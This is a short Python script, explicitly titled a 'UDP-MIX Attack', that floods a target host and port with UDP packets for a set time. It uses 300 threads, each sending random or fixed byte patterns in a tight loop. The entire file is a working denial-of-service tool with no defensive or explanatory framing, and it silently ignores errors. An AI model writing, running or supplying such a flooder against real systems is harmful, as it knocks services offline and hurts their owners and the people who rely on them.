import sys
import socket
import threading
import time
import random

if len(sys.argv) != 4:
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
attack_time = int(sys.argv[3])

running = True

def send_udp_variant(variant_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while running:
            if variant_id == 0:
                size = random.randint(64, 512)
                data = bytes([random.randint(0, 255) for _ in range(size)])
            elif variant_id == 1:
                size = 750
                data = b"\xFF" * size
            elif variant_id == 2:
                size = random.randint(128, 1024)
                data = bytes([i % 256 for i in range(size)])
            elif variant_id == 3:
                size = 375
                data = b"\x00" * size
            elif variant_id == 4:
                size = random.randint(256, 768)
                data = b"\xAA" * size
            else:
                size = random.randint(512, 1400)
                data = bytes([random.getrandbits(8) for _ in range(size)])
            
            sock.sendto(data, (host, port))
            time.sleep(random.uniform(0.001, 0.01))
    
    except:
        pass
    finally:
        sock.close()

def timer():
    global running
    time.sleep(attack_time)
    running = False

def attack():
    print(f"UDP-MIX Attack to {host}:{port} for {attack_time}s")
    
    timer_thread = threading.Thread(target=timer, daemon=True)
    timer_thread.start()
    
    threads = []
    for i in range(50):
        for variant in range(6):
            t = threading.Thread(target=send_udp_variant, args=(variant,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.01)
    
    timer_thread.join()
    print("Attack finished")

if __name__ == "__main__":
    attack()
